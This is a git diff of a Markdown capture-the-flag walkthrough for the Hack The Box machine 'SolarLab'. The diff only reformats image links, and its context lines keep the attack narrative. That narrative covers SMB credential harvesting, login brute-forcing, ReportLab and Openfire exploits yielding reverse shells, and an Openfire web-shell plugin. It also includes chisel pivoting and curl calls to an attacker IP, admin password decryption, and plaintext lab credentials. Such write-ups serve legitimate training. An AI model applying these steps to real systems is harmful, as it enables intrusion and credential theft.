@@ -50,13 +50,13 @@ Port description:
 
 Nmap scans found two hostnames `solarlab.htb` on port 80 and `report.solarlab.htb` on port 6791. Adding to my `/etc/hosts` file.
 
-![[Screenshots/SolarLab_image_1.png]]
+![](/Screenshots/SolarLab_image_1.png)
 
 # 80 / HTTP
-![[Screenshots/SolarLab_image_2.png]]
+![](/Screenshots/SolarLab_image_2.png)
 
 Looking at the source, just appears to be a static site. Footer has some theme information `jeweltheme`
-![[Screenshots/SolarLab_image_3.png]]
+![](/Screenshots/SolarLab_image_3.png)
 ```html
 <!-- Footer Section -->
 		<footer id="footer-section">
@@ -83,7 +83,7 @@ Running gobuster to enum and dirs or files, doesn't find anything interesting
 ```
 
 ## 6791 / HTTP
-![[Screenshots/SolarLab_image_4.png]]
+![](/Screenshots/SolarLab_image_4.png)
 
 Default page is a login form. Running gobuster, there may be some throttling or the server is just unstable as we start seeing 502 errors.
 
@@ -92,11 +92,11 @@ Default page is a login form. Running gobuster, there may be some throttling or 
 └─$ gobuster dir -u $URL -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -t 20 -x php -b 404 -o gobuster-6791.out 
 ```
 
-![[Screenshots/SolarLab_image_5.png]]
+![](/Screenshots/SolarLab_image_5.png)
 
 
 Examining a login request with burp suite;
-![[Screenshots/SolarLab_image_6.png]]
+![](/Screenshots/SolarLab_image_6.png)
 
 Running sqlmap against the request doesn't return any injectable parameters.
 
@@ -121,14 +121,14 @@ Checking out the smb server to see if we can access any shares:
 ┌──(fish㉿kali)-[~/htb/solarlab]
 └─$ smbclient -U '' \\\\solarlab.htb\\Documents\\ 
 ```
-![[Screenshots/SolarLab_image_7.png]]
+![](/Screenshots/SolarLab_image_7.png)
 
 And we can read files from the `Documents` share. i'm going to download all the files and check them out on my kali box.
-![[Screenshots/SolarLab_image_8.png]]
+![](/Screenshots/SolarLab_image_8.png)
 
 Checking out `details-file.xlsx` gets us some potential creds and emails.
 
-![[Screenshots/SolarLab_image_9.png]]
+![](/Screenshots/SolarLab_image_9.png)
 ```bash
 Usernames:
 
@@ -161,12 +161,12 @@ Nothing else really interesting in the other files.
 
 Lets see if we can use this to login to the web app.
 
-![[Screenshots/SolarLab_image_10.png]]
+![](/Screenshots/SolarLab_image_10.png)
 
 Not with those passwords, but we can identify user names. Responses of length 2419 have a different error than requests with usernames that don't exist.
 `User authentication error.`.
 
-![[Screenshots/SolarLab_image_11.png]]
+![](/Screenshots/SolarLab_image_11.png)
 
 This gives us two valid usernames for the app. We can take an educated guess and add `blakeb` as this seems to be the correct format
 ```bash
@@ -177,19 +177,19 @@ blakeb
 
 Adding the username `blakeb` and re-running intruder gets us a valid login with
 `blakeb:ThisCanB3typedeasily1@`
-![[Screenshots/SolarLab_image_12.png]]
+![](/Screenshots/SolarLab_image_12.png)
 
-![[Screenshots/SolarLab_image_13.png]]
+![](/Screenshots/SolarLab_image_13.png)
 
 
 We can use the app got generate PDFs.
 
-![[Screenshots/SolarLab_image_14.png]]
-![[Screenshots/SolarLab_image_15.png]]
-![[Screenshots/SolarLab_image_16.png]]
+![](/Screenshots/SolarLab_image_14.png)
+![](/Screenshots/SolarLab_image_15.png)
+![](/Screenshots/SolarLab_image_16.png)
 
 Looking at the PDF that's returned the app is using ReportLab for PDF generation
-![[Screenshots/SolarLab_image_17.png]]
+![](/Screenshots/SolarLab_image_17.png)
 
 
 
@@ -203,15 +203,15 @@ There's a vulnerability within certain version of ReportLab allowing code execti
 
 There's multiple exploits on github for this, I attempted to manually exploit it with the payload from https://ethicalhacking.uk/cve-2023-33733-rce-in-reportlabs-html-parser/#gsc.tab=0 but was having issues due to character limits in the `user_input` field of the request.
 
-![[Screenshots/SolarLab_image_18.png]]
-![[Screenshots/SolarLab_image_19.png]]
+![](/Screenshots/SolarLab_image_18.png)
+![](/Screenshots/SolarLab_image_19.png)
 
 Found another version of the exploit that works and gets us a reverse powershell shell.
 https://github.com/L41KAA/CVE-2023-33733-Exploit-PoC
-![[Screenshots/SolarLab_image_20.png]]
+![](/Screenshots/SolarLab_image_20.png)
 
-![[Screenshots/SolarLab_image_21.png]]
-![[Screenshots/Pasted image 20240831165228.png]]
+![](/Screenshots/SolarLab_image_21.png)
+![](/Screenshots/Pasted image 20240831165228.png)
 
 
 
@@ -226,7 +226,7 @@ https://github.com/L41KAA/CVE-2023-33733-Exploit-PoC
 Downloaded winipeas to the box to check for any easy escalations.
 
 
-![[Screenshots/SolarLab_image_22.png]]
+![](/Screenshots/SolarLab_image_22.png)
 
 ```bash
 PS C:\Users\blake\Desktop> type ../Documents/start-app.bat
@@ -245,7 +245,7 @@ goto loopstart
 
 `start-app.bat`, has a service listening on localhost:5000. Looking into it it's just the instance of reportlab. Winpeas didn't pick it up for some reason but running netstat shows a listening port on 9090. 
 
-![[Screenshots/SolarLab_image_23.png]]
+![](/Screenshots/SolarLab_image_23.png)
 
 
 Setting up a reverse socks proxy with chisel so we can view the app on port 9090 from our browser.
@@ -257,7 +257,7 @@ Setting up a reverse socks proxy with chisel so we can view the app on port 9090
 PS C:\Users\blake\Desktop> ./chisel.exe client 10.10.14.7:443 R:socks
 ```
 
-![[Screenshots/SolarLab_image_24.png]]
+![](/Screenshots/SolarLab_image_24.png)
 
 `Openfire, Version: 4.7.4`
 https://github.com/K3ysTr0K3R/CVE-2023-32315-EXPLOIT
@@ -276,26 +276,26 @@ There's an exploit for OpenFIre and this version doesn't appear to be patched.
 [+] Username: hugme
 [+] Password: HugmeNOW
 ```
-![[Screenshots/SolarLab_image_25.png]]
+![](/Screenshots/SolarLab_image_25.png)
 
-![[Screenshots/SolarLab_image_26.png]]
+![](/Screenshots/SolarLab_image_26.png)
 
 And we can login to the web server.
 
 
 
-![[Screenshots/SolarLab_image_27.png]]
+![](/Screenshots/SolarLab_image_27.png)
 
 
 Uploaded plugin
-![[Screenshots/SolarLab_image_28.png]]
+![](/Screenshots/SolarLab_image_28.png)
 
 We can then find the tool at Server >> Server Settings >> Management Tool and we can plugin the password to access the web shell.
 
-![[Screenshots/SolarLab_image_29.png]]
+![](/Screenshots/SolarLab_image_29.png)
 
 We can select system command from the pull down to execute commands
-![[Screenshots/SolarLab_image_30.png]]
+![](/Screenshots/SolarLab_image_30.png)
 
 We can get a shell as the openfire user by downloading a rev shell and then sending a second command to execute it.
 ```bash
@@ -312,9 +312,9 @@ curl.exe file://10.10.14.7/test
 curl: (37) Couldn't open file //10.10.14.7/test
 ```
 
-![[Screenshots/SolarLab_image_31.png]]
+![](/Screenshots/SolarLab_image_31.png)
 
-![[Screenshots/SolarLab_image_32.png]]
+![](/Screenshots/SolarLab_image_32.png)
 
 Openfire db script with the admin's password
 
@@ -327,8 +327,8 @@ We can download a tool to crack it
 https://github.com/c0rdis/openfire_decrypt/blob/master/OpenFireDecryptPass.java
 
 We need the encrypted password and the password key
-![[Screenshots/SolarLab_image_33.png]]
-![[Screenshots/SolarLab_image_34.png]]
+![](/Screenshots/SolarLab_image_33.png)
+![](/Screenshots/SolarLab_image_34.png)
 ```bash
 becb0c67cfec25aa266ae077e18177c5c3308e2255db062e4f0b77c577e159a11a94016d57ac62d4e89b2856b0289b365f3069802e59d442
 
@@ -343,7 +343,7 @@ ThisPasswordShouldDo!@ (hex: 005400680069007300500061007300730077006F00720064005
 
 ```
 
-![[Screenshots/SolarLab_image_35.png]]
+![](/Screenshots/SolarLab_image_35.png)
 
 And we got the admin's password!
 ```
@@ -351,7 +351,7 @@ administrator:ThisPasswordShouldDo!@
 ```
 
 We can then access the box with psexec.py and grab the admin flag.
-![[Screenshots/SolarLab_image_36.png]]
+![](/Screenshots/SolarLab_image_36.png)
 
 
 
